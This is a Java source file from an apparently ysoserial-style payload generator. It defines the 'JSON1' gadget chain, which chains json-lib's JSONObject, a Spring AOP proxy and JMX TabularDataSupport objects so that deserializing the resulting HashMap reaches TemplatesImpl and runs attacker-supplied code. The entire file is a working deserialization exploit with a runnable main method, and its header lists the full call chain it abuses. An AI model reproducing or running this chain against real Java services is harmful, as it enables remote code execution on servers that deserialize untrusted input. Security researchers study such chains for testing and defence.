package com.ppp.chain.json;

import com.ppp.KickOff;
import com.ppp.ObjectPayload;
import com.ppp.annotation.Authors;
import com.ppp.annotation.Dependencies;
import com.ppp.chain.WrapSerialization;
import com.ppp.secmgr.PayloadRunner;
import com.ppp.sinks.SinkScheduler;
import com.ppp.sinks.SinksHelper;
import com.ppp.sinks.annotation.Sink;
import com.ppp.utils.RanDomUtils;
import com.ppp.utils.Reflections;
import net.sf.json.JSONObject;
import org.springframework.aop.framework.AdvisedSupport;

import javax.management.openmbean.*;
import javax.xml.transform.Templates;
import java.lang.reflect.InvocationHandler;
import java.util.HashMap;
import java.util.Map;

/**
 * A bit more convoluted example
 * <p>
 * com.sun.org.apache.xalan.internal.xsltc.trax.TemplatesImpl.getOutputProperties()
 * java.lang.reflect.Method.invoke(Object, Object...)
 * org.springframework.aop.support.AopUtils.invokeJoinpointUsingReflection(Object, Method, Object[])
 * org.springframework.aop.framework.JdkDynamicAopProxy.invoke(Object, Method, Object[])
 * $Proxy0.getOutputProperties()
 * java.lang.reflect.Method.invoke(Object, Object...)
 * org.apache.commons.beanutils.PropertyUtilsBean.invokeMethod(Method, Object, Object[])
 * org.apache.commons.beanutils.PropertyUtilsBean.getSimpleProperty(Object, String)
 * org.apache.commons.beanutils.PropertyUtilsBean.getNestedProperty(Object, String)
 * org.apache.commons.beanutils.PropertyUtilsBean.getProperty(Object, String)
 * org.apache.commons.beanutils.PropertyUtils.getProperty(Object, String)
 * net.sf.json.JSONObject.defaultBeanProcessing(Object, JsonConfig)
 * net.sf.json.JSONObject._fromBean(Object, JsonConfig)
 * net.sf.json.JSONObject.fromObject(Object, JsonConfig)
 * net.sf.json.JSONObject(AbstractJSON)._processValue(Object, JsonConfig)
 * net.sf.json.JSONObject._processValue(Object, JsonConfig)
 * net.sf.json.JSONObject.processValue(Object, JsonConfig)
 * net.sf.json.JSONObject.containsValue(Object, JsonConfig)
 * net.sf.json.JSONObject.containsValue(Object)
 * javax.management.openmbean.TabularDataSupport.containsValue(CompositeData)
 * javax.management.openmbean.TabularDataSupport.equals(Object)
 * java.util.HashMap<K,V>.putVal(int, K, V, boolean, boolean)
 * java.util.HashMap<K,V>.readObject(ObjectInputStream)
 *
 * @author mbechler
 */
@Dependencies({"net.sf.json-lib:json-lib:jar:jdk15:2.4", "org.springframework:spring-aop:4.1.4.RELEASE",
        // deep deps
        "aopalliance:aopalliance:1.0", "commons-logging:commons-logging:1.2", "commons-lang:commons-lang:2.6",
        "net.sf.ezmorph:ezmorph:1.0.6", "commons-beanutils:commons-beanutils:1.9.2",
        "org.springframework:spring-core:4.1.4.RELEASE", "commons-collections:commons-collections:3.1"})
@Authors({Authors.MBECHLER})
@Sink({Sink.TemplatesImpl})
public class JSON1 implements ObjectPayload<Object> {

    public static void main(String[] args) throws Exception {
        PayloadRunner.run(JSON1.class, args);
    }

    public Object getObject(SinksHelper sinksHelper) throws Exception {
        // sink
        Object sinkObject = SinkScheduler.builder(sinksHelper);

        // wrap
        if (sinksHelper.getWrapSerialization() != null) {
            Object o = WrapSerialization.scheduler(sinkObject, sinksHelper);
            sinkObject = (o != null) ? o : sinkObject;
        }

        Object kickOffObject = getChain(sinkObject);

        return kickOffObject;
    }

    public Object getChain(Object templates) throws Exception {

        CompositeType rt = new CompositeType(RanDomUtils.generateRandomString(1), RanDomUtils.generateRandomString(1), new String[]{
                "a"
        }, new String[]{
                "a"
        }, new OpenType[]{
                javax.management.openmbean.SimpleType.INTEGER
        });
        TabularType tt = new TabularType(RanDomUtils.generateRandomString(1), RanDomUtils.generateRandomString(1), rt, new String[]{
                "a"
        });
        TabularDataSupport t1 = new TabularDataSupport(tt);
        TabularDataSupport t2 = new TabularDataSupport(tt);

        // we need to make payload implement composite data
        // it's very likely that there are other proxy impls that could be used
        AdvisedSupport as = new AdvisedSupport();
        as.setTarget(templates);
        InvocationHandler delegateInvocationHandler = (InvocationHandler) Reflections.newInstance("org.springframework.aop.framework.JdkDynamicAopProxy", as);
//        InvocationHandler cdsInvocationHandler = KickOff.annotationInvocationHandler(KickOff.createMap("getCompositeType", rt));
//        InvocationHandler invocationHandler = (InvocationHandler) Reflections.newInstance("com.sun.corba.se.spi.orbutil.proxy.CompositeInvocationHandlerImpl");
//        ((Map) Reflections.getFieldValue(invocationHandler, "classToInvocationHandler")).put(CompositeData.class, cdsInvocationHandler);
//        Reflections.setFieldValue(invocationHandler, "defaultHandler", delegateInvocationHandler);
//        final CompositeData cdsProxy = KickOff.createProxy(invocationHandler, CompositeData.class, Templates.class);
        final CompositeData cdsProxy = KickOff.createProxy(delegateInvocationHandler, CompositeData.class, Templates.class);

        JSONObject jo = new JSONObject();
        Map m = new HashMap();
        m.put(RanDomUtils.generateRandomString(1), cdsProxy);
        Reflections.setFieldValue(jo, "properties", m);
        Reflections.setFieldValue(jo, "properties", m);
        Reflections.setFieldValue(t1, "dataMap", jo);
        Reflections.setFieldValue(t2, "dataMap", jo);
        return KickOff.makeMap(t1, t2);
    }
}
